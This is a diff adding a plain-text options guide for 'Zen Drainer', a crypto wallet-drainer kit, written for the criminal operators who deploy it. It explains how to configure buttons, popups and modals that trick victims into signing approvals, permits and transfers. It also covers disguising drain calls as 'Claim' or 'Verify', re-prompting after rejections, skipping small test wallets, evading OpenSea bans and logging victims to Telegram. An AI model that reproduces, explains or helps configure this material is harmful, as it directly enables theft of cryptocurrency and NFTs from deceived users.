@@ -1,0 +1,123 @@
+
+    Welcome to Zen Drainer's Options explainations:
+
+    Class Buttons:
+        – connect_buttons_class: The class of the button you want to drainer on. Note that this option can be the same as "connect_buttons_class" one, not recommended to edit if you don't need any specific config.
+        – drain_buttons_class: The class of the buttons you want the drain process (require "wait_click_of_drain_button_to_start" enabled) and write intructions. Note: this option can be the same as "connect_buttons_class" one, not recommended to edit if you don't require any specific config.
+
+    Class Buttons Options:
+        – change_buttons_text: If you want texts replaced of button (if css is broken switch it to false).
+        – loading_text: Text of buttons when victim is fetching assets (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
+        – verify_text: Text of buttons when victim when signature is asked. (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
+        – connect_text: Text of buttons that victim will see before connecting his wallet. (require "change_buttons_text" enabled)
+        – connected_text: Text of buttons when once wallet is connected, you can add "{wallet}" on the text for display user address (require "change_buttons_text" enabled & connect_buttons_class different than drain_buttons_class)
+        – drain_button_waiting_click_text: Text of buttons that victim will see before to connecting his wallet (require "change_buttons_text" enabled & connect_buttons_class is different than drain_buttons_class)
+        – change_chain_text: Text on buttons once Chain-Switch is prompted (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
+        – not_eligible_text: Text on buttons once connected wallet is empty or once all drain is done. (require "change_buttons_text" enabled) & on popup (require "enable_popup" enabled)
+        – error_text: Text on buttons when the drainer can't get wallet address. (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
+
+        – wait_click_of_drain_button_to_start: If "connect_buttons_class" is different than "drain_buttons_class", it will wait buttons with class of "drain_buttons_class" click for start drainer process.
+
+    Disable Methods:
+        – disable_permit2: Do not edit it
+        – disable_seaport: Do not edit it
+        – disable_permit: Do not edit it
+        – disable_swap: Do not edit it
+        – disable_blur: Do not edit it
+        – disable_wyvern: Do not edit it
+        – disable_x2y2_batch_transfer: Do not edit it
+
+
+    Various Options:
+        – use_token_transfer: If you prefer to use approvement or token transfer.
+        – use_increase_allowance_for_tokens_when_disponible: If you want to use Increase Allowance popup ("use_approvement_for_tokens" must be true)
+        – use_token_transfer_if_increase_allowance_not_disponible: If the token doesn't support the Increase Allowance method, it will use token transfer
+        – use_transfer_contract: Use a smart-contract for all balance hits, Victim will see datas of "transfer_contract_drain_function_name" + 0x000...0000 address
+
+        – transfer_contract_drain_function_name: The name of the method used to drain the balance using smart-contract. Possibilities: Claim, Confirm, Verify, Connect, Start, Gift and Enable 🔺
+
+        – create_wallet_for_seaport: Create a new wallet for each seaport and send you private key to avoid opensea ban. not recommended to edit because blur is now better than opensea. ("disable_seaport" must be false)
+
+        – retry_count: The max number of retries with Same Method once user reject the popup
+        – max_change_chain_retry: The max number of Chain-Switch retries once user reject the popup
+
+
+    enable_popup: Will prompt a Sweet Alert popup at each drain step:
+        – popup_style: Define the popup style, check below. (enable_popup must be true)
+        – popup_2_config, Check at the bottom of this txt, (popup_style must be 2)
+        – popup_3_config, Check at the bottom of this txt, (popup_style must be 3)
+        – popup_4_config, Check at the bottom of this txt, (popup_style must be 4)
+
+    Modals Options:
+        – modal_style: Modal style, check below.
+        – modal_theme: Theme of the modal, "dark", "light" or "default"
+        – use_window_provider_if_detected: Directly use the injected wallet on browser is detected (example: if MetaMask is detected, directly try to connect without button click)
+        – wallet_connect_config: Check at the bottom of this txt
+        – auto_prompt: Prompt the modal as soon as the site is loaded (require "use_window_provider_if_detected" true)
+        – click_everywhere_open_modal: Prompt the modal if user click anywhere in the page
+        – wallet_connect_v2_project_id: If you use modal 3, it's recommended to set it. Get your own Project-ID at https://cloud.walletconnect.com
+
+    Logs Options:
+        – log_prompts: If you want to see all the victim's prompts. Not recommended because telegram rate limit
+        – log_chains_accepts: If you want to log when the victim approve change chain
+        – hide_poor_connects: Will hide all empty connects from your logs
+        – log_full_site_url: Log full site url instead of domain
+
+    Minimum Values Options:
+        – min_ratio_for_ask_change_chain: Number between 0 and 1 calculated to know from how many timems it will try to change chain (1 = will change of chain every asset (if needed) and 0 = will avoid to change chain a maximum). Not recommended to edit if you don't know how it works, try it before!   
+        – min_wallet_total_value: Minimal prompt value, some victims connects in first a small wallet to check if drainer prompt and then a big one. Not recommended to edit this value.
+
+        – balance_transfers_in_last_position: Put the balance transfers at the end of prompts. Not recommended to edit, only if you really don't need it at 100%.
+
+    Slippage Options:
+        – slipage_on_swap: Set the slippage for the swap feature: 50% = can swap 100$ for min 50$, 0% = can swap 100$ for min 99$. More the is low, more the swap can fail on little tokens (in case of predict fail, it will use another drain way). ("disable_swap" must be false)
+        – use_default_price_slippage: If drainer will calculate the slippage from the default token price or by default by contract
+
+        – use_cache_data: If you want to save all victim's drained assets on cache to avoid trying to drain 2 times the same asset in case of refresh and reconnect.
+
+    Max Elements Options:
+        – max_elements_on_seaport: Choose how many items can be drained at maximum by Seaport. This option make chance smaller of a fail in case of NFTs staked.
+        – max_elments_on_blur: Choose how many items can be drained at maximum by Blur. This option make chance smaller of a fail in case of NFTs staked.
+
+        – wait_page_load: If you got many buttons, set this to true, it will let all buttons load before starting
+
+        – disable_eth_sign_if_wallet_connect: disable eth_sign if the user use wallet connect for avoid to say invalid sign if victim use hardware wallet.
+
+###########################################################################
+
+    Here is 3 possible popups: 1/3 are Recommended
+        Popup 1: https://ibb.co/VW7t9qH
+        Popup 2: https://ibb.co/02Hn4GH
+        Popup 3: https://ibb.co/qdh2JDs
+
+    You can edit the settings of popup 2 with "popup_2_config":
+        – title: Title of the popup.
+        – message: Message on the popup (the one with green check on the left).
+        – max_time_before_auto_close: Time before the popup auto-close.
+
+    You can edit the settings of popup 3 with "popup_3_config":
+        – title: Title of the popup.
+        – max_time_before_auto_close: Time before the popup auto-close.
+
+    You can edit the settings of popup 3 with "popup_4_config":
+        – open_function: The function that drainer will call for open modal.
+        – close_function: The function that drainer will call for close modal.
+        – max_time_before_auto_close: Time before the popup auto-close.
+
+    Here are 4 modals possible:
+        Modal 1: https://ibb.co/jkZ2nQW (dark) & https://ibb.co/JBtk69t (light)
+        Modal 2: https://ibb.co/4FxZr3z (dark) & https://ibb.co/1qnjpwD (light)
+        Modal 3: https://ibb.co/4RTRKpP (dark) & https://ibb.co/3d2vcfT (light)
+        Modal 4: https://ibb.co/BwRKyss (dark) & https://ibb.co/37rkDVX (light)
+
+
+    You can edit wallet connnect design with "wallet_connect_config" option (If the modal style is 3 it will diretly edit the modal):
+        – logo_url: Define the logo.
+        – background_image: Define the backgorund image.
+        – background_color: Define the background color (support hex color with # in front).
+        – accent_color: Define the color of the main texts (support hex color with # in front).
+        – accept_fill_color: Define the color of the fill text, not very usefull (support hex color with # in front).
+        – overlay_background_color:  Define the color of the overlay(support hex color with # in front).
+        – font_family: Define the fonts to use.
+
+    Example of modal 3 with custom options: https://i.ibb.co/PCvK5M6/modal-3-custom.png
